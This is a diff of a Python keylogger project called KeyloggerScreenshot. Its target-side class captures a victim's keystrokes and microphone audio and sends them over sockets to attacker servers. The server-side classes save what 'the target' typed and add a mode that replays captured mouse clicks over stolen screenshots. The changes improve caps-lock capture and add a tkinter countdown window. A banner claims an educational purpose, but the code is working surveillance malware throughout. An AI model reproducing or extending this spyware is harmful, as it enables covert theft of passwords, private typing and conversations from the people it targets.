@@ -1,3 +1,4 @@
+import PIL.Image
 from pynput import keyboard
 from pynput.mouse import Listener
 import time
@@ -11,6 +12,7 @@ import threading
 import ast
 import BetterPrinting as bp
 import random
+import tkinter as tk
 
 class KeyloggerTarget:
     def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
@@ -33,6 +35,8 @@ class KeyloggerTarget:
         ip_listener = self.ip_listener
         port_listener = self.port_listener
         listening_time = self.duration
+        self.check = []
+        self.caps = False
         self.richtige_liste = None
         self.coordinates = None
         self.richtige_liste = []
@@ -43,7 +47,7 @@ class KeyloggerTarget:
         listening_data.connect((ip_listener, port_listener))
 
         format = pyaudio.paInt16
-        kanäle = 2
+        channels = 2
         rate = 44100
         chunk = 1024
         seconds = listening_time + 1
@@ -51,7 +55,7 @@ class KeyloggerTarget:
         audio = pyaudio.PyAudio()
 
         # start Recording
-        stream = audio.open(format=format, channels=kanäle,
+        stream = audio.open(format=format, channels=channels,
                             rate=rate, input=True,
                             frames_per_buffer=chunk)
         # print("recording...")
@@ -192,17 +196,32 @@ class KeyloggerTarget:
 
     def on_press(self, key):
         try:
-            print(f'Alphabetische Taste wurde gedrückt: {key.char} ')
-            self.richtige_liste += key.char
-            # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"
+            try:
+                if self.caps is True: word = key.char.upper()
+                else: word = key.char
 
-            print(self.richtige_liste)
+                print(f'Alphabetische Taste wurde gedrückt: {word} ')
+                self.richtige_liste += word
+                # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"
+
+                print(self.richtige_liste)
+            except TypeError:
+                pass
+
         except AttributeError:
             print(f'Eine andere Taste wurde gedrückt: {key}')
             if key == keyboard.Key.space or key == keyboard.Key.tab:
                 self.richtige_liste += "{"
                 # If the target presses tab or space a "{" will be appended to the list so the attacker knows when and
                 # space or a tab key has been pressed
+            elif key == keyboard.Key.caps_lock:
+                self.caps = True
+                self.check.append(1)
+            check_caps = sum(self.check) / 2
+            #If check_caps is not primary it will set self.caps to False
+
+            if str(check_caps)[-1] != '0': pass
+            else: self.caps = False
 
     def on_release(self, key):
         print(f'Key released: {key}')
@@ -232,33 +251,32 @@ class KeyloggerTarget:
                 listener.join()
                 # This listens to the keys that where typed
 
-
 class ServerKeylogger:
     # This is the class of the Server. Both Server should not be in the same file
-    def __init__(self, ip, port):
+    def __init__(self, ip, port, simulater=False):
         self.ip = ip
         self.port = port
-
+        self.simulater = simulater
+        self.new_data = None
     def message(self, real_data):
-        global new_data
         # To know if the server has some issues
         for zeichen in real_data:
             if "{" == zeichen:
                 # "{" this detects if a space or a tab is in full_msg
-                new_data = real_data.replace("{", " ")
+                self.new_data = real_data.replace("{", " ")
 
         # The data is being stored in full_msg
-        bp.color(f"Text of target: {new_data}", "magenta")
+        bp.color(f"Text of target: {self.new_data}", "magenta")
         zeit = time.strftime("%H-%M-%S-%Y")
         # This is the time the data has arrived
-        if new_data != "":
+        if self.new_data != "":
             with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
-                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{new_data}")
+                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{self.new_data}")
 
         else:
             bp.color("The Target didn't type something...", "magenta")
 
-    def check_double(self):
+    def check_double(self): #This function is here to check if there are more files with the same name
         dir = os.listdir()
         check = [each_name for each_name in dir if "mouseInfo" in each_name]
         if len(check) == 0:
@@ -269,7 +287,53 @@ class ServerKeylogger:
 
         return filename
 
+    def countdown(self):
+        global seconds
+        global startbutton
+        global tkWindow
+        real_sec = seconds
+        seconds = seconds + 4
+        #Plus four seconds because of the time the code sleeps
+        tkWindow = tk.Tk()
+        tkWindow.geometry('295x367')
+        tkWindow.title('KeyloggerScreenshot')
+        minutes = seconds // 60
+        this_min = minutes * 60
+        this_sec = seconds - this_min
+        print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")
+
+        while seconds: #Same like Timer Class
+            mins, secs = divmod(seconds, 60)
+            timer = '{:02d}:{:02d}'.format(mins, secs)
+            print(f"\rTime left: {timer}", end="")
+            time.sleep(1)
+            seconds -= 1
+        print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
+        #GUI BY: DYMA020
+        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=self.changecol, height=10, width=30)
+        #Puts everything on place
+        startbutton.grid(row=1, column=0)
+        if real_sec < 60:
+            text = f"Simulation for {real_sec} seconds"
+        else:
+            m, s = divmod(real_sec, 60)
+            timer = '{:02d}:{:02d}'.format(m, s)
+            text = f"Simulation for {timer} minutes"
+        #Just for decoration
+        tk.Button(tkWindow, text=text, command=self.connection, height=10, width=30).grid(row=2, column=0)
+        tkWindow.mainloop()
+
+    def changecol(self): #This function is here to if the simulation has ended
+        startbutton.configure(bg="red")
+        #This is the button
+        startbutton["text"] = "Stop simulation"
+        tkWindow.destroy()
+
+    def connection(self):
+        print("Successful connection")
+
     def start(self):
+        global seconds
         try:
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server.bind((self.ip, self.port))
@@ -332,8 +396,73 @@ class ServerKeylogger:
 
                 bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
                 bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
-                os._exit(0)
                 # This shuts down the server
+
+            if self.simulater is True:
+                start = input("Do you want to start y/n?: ")
+                if start not in ["y", "yes"]:
+                    print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
+                    sys.exit()
+
+                if sys.platform != "linux":
+                    print("\nThis simulation is only availible on linux. The Windows version is coming soon")
+                    print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
+                    sys.exit()
+
+                mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
+                #Looks for coordinates in mouseInfoLog
+
+                if not mouse_coordinates:
+                    #If there isn't a file called mouseInfoLog it will destroy itself
+                    print("\nThe target hasn't clicked anything")
+                    print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
+                    sys.exit()
+
+                every_coordinate = []
+                for each_core in mouse_coordinates:
+                    fhandle = open(each_core)
+                    for line in fhandle:
+                        if "[" in line:
+                            every_coordinate += ast.literal_eval(line)
+                            #This makes a list out of a string
+
+                img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
+                #This checks for all Images in the directory
+
+                if not img_files:
+                    print('There is no "New_Image" in this directory')
+                    sys.exit()
+
+                speed = 0.47
+                #This is the time each coordinate needs
+                sleep = 1.5
+                #This is the time where the code is taking a time out
+                one_coordinate = speed + sleep
+
+                duration_seconds = one_coordinate * len(every_coordinate)
+                summed_up = duration_seconds * len(img_files) + 2 * len(img_files)
+                seconds = round(summed_up)
+                #This calculates the amount it will take
+
+                print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
+                threading_count = threading.Thread(target=self.countdown)
+                #The countdown will start
+                threading_count.start()
+
+                pg.sleep(4)
+                for image in img_files:
+                    im = PIL.Image.open(image)
+                    #Opens the image
+                    im.show()
+                    time.sleep(2)
+                    fullscreen = pg.locateCenterOnScreen("fullscreen.png")
+                    #Makes the image in the perfect resolution
+                    if fullscreen:
+                        pg.click(fullscreen)
+                        for x, y in every_coordinate:
+                            pg.moveTo(x, y, 0.3)
+                            time.sleep(sleep)
+                        pg.press("esc")
 
         except OSError:
             raise OSError("Change the port number to run without an error")
@@ -354,9 +483,10 @@ class ServerPhotos:
 /_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
             /____/           /____/ /____/    
 
-                        ~Created by: Fawaz Bashiru~             
+                        ~Created by: Fawaz Bashiru~          
+                        ~Write "python KLS_start.py -help" for help in the github version~   
                         REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
-                        SO DON'T USE THIS FOR EVIL ACTIVITIES                        
+                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
         """
 
         print(gui)
@@ -406,13 +536,16 @@ class ServerListener:
         self.port = port
 
     def check_double(self):
+        #This function checks if The Audio file is already in the directory
         dir = os.listdir()
         check = [each_name for each_name in dir if "Audio of Target" in each_name]
         if len(check) == 0:
+            #If the directory has no file it will set the filename to default
             filename = "Audio of Target.wav"
         else:
             amount = len(check) + 1
             filename = f"Audio of Target {amount}.wav"
+            #Filename will now be the amount of the audiofiles therer are directory
 
         return filename
 
